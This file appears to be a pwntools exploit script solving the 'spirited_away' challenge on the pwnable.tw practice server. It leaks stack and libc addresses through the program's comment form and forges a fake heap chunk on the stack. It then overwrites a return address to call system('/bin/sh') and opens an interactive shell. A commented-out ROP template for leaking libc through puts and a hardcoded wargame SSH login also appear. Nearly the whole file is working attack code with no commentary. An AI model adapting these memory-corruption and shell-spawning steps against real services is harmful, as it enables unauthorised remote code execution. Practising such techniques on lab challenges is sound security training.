from pwn import *
####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './spirited_away_patched'
REMOTE_BIN = '~/vuln' #For ssh
LIBC = ELF('./libc.so.6') #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('chall.pwnable.tw', 10204) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, '')





#####################
#### Find Gadgets ###
#####################
# try:
#     libc_func = 'puts'
#     PUTS_PLT = ELF_LOADED.plt['puts'] #PUTS_PLT = ELF_LOADED.symbols['puts'] # This is also valid to call puts
# except:
#     libc_func = 'printf'
#     PUTS_PLT = ELF_LOADED.plt['printf']
#
# MAIN_PLT = ELF_LOADED.symbols['main']
# POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep 'pop rdi'
# RET = (ROP_LOADED.find_gadget(['ret']))[0]
#
# log.info('Main start: ' + hex(MAIN_PLT))
# log.info('Puts plt: ' + hex(PUTS_PLT))
# log.info('pop rdi; ret  gadget: ' + hex(POP_RDI))
# log.info('ret gadget: ' + hex(RET))


#########################
#### Finf LIBC offset ###
#########################
#
# def generate_payload_aligned(rop):
#     payload1 = OFFSET + rop
#     if (len(payload1) % 16) == 0:
#         return payload1
#
#     else:
#         payload2 = OFFSET + p64(RET) + rop
#         if (len(payload2) % 16) == 0:
#             log.info('Payload aligned successfully')
#             return payload2
#         else:
#             log.warning(f'I couldn't align the payload! Len: {len(payload1)}')
#             return payload1
#
#
# def get_addr(libc_func):
#     FUNC_GOT = ELF_LOADED.got[libc_func]
#     log.info(libc_func + ' GOT @ ' + hex(FUNC_GOT))
#     # Create rop chain
#     rop1 = p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
#     rop1 = generate_payload_aligned(rop1)
#
#     # Send our rop-chain payload
#     #P.sendlineafter('dah?', rop1) #Use this to send the payload when something is received
#     print(P.clean()) # clean socket buffer (read all and print)
#     P.sendline(rop1)
#
#     # If binary is echoing back the payload, remove that message
#     recieved = P.recvline().strip()
#     if OFFSET[:30] in recieved:
#         recieved = P.recvline().strip()
#
#     # Parse leaked address
#     log.info(f'Len rop1: {len(rop1)}')
#     leak = u64(recieved.ljust(8, b'\x00'))
#     log.info(f'Leaked LIBC address,  {libc_func}: {hex(leak)}')
#
#     # Set lib base address
#     if LIBC:
#         LIBC.address = leak - LIBC.symbols[libc_func] #Save LIBC base
#         log.info('LIBC base @ %s' % hex(LIBC.address))
#
#     # If not LIBC yet, stop here
#     else:
#         print('TO CONTINUE) Find the LIBC library and continue with the exploit... (https://LIBC.blukat.me/)')
#         P.interactive()
#
#     return hex(leak)
#
# get_addr(libc_func) #Search for puts address in memmory to obtain LIBC base



##############################
##### FINAL EXPLOITATION #####
##############################

def sendComment(name, age, reason, comment):
    P.sendlineafter(b'name: ', name)
    P.sendlineafter(b'age: ', age)
    P.sendlineafter(b'movie? ', reason)
    P.sendlineafter(b'comment: ', comment)
    log.info('Send 1 comment!')


def sendComment2(name, reason, comment):
    P.sendlineafter(b'name: ', name)
    P.sendlineafter(b'movie? ', reason)
    P.sendlineafter(b'comment: ', comment)
    log.info('Send 1 comment!')

sendComment(b'A',b'a',b'a'*79,b'a'*79)
P.recvline()
P.recvline()
P.recvline()
P.recvline()
reason_stack = u32(P.recv(4))-0x70
P.recv(4)
LIBC.address = u32(P.recv(4))-0x1b0d60
P.clean()
print(hex(reason_stack))
print(hex(LIBC.address))
P.sendline(b'y')
for i in range(0,100):
    sendComment(b'a',b'a',b'a',b'a')
    P.sendlineafter(b'<y/n>:', b'y')

BINSH = next(LIBC.search(b'/bin/sh')) #Verify with find /bin/sh
sendComment2(b'a',b'a'*0x44+p32(0x41),b'a'*0x50+p32(0x100)+p32(reason_stack+0x8)+p32(0)+p32(0x41))
P.sendlineafter(b'<y/n>:', b'y')
sendComment2(b'a'*(0x48+4)+p32(LIBC.sym['system'])*2+p32(BINSH),b'a',b'a')
P.sendlineafter(b'<y/n>:', b'n')

P.interactive()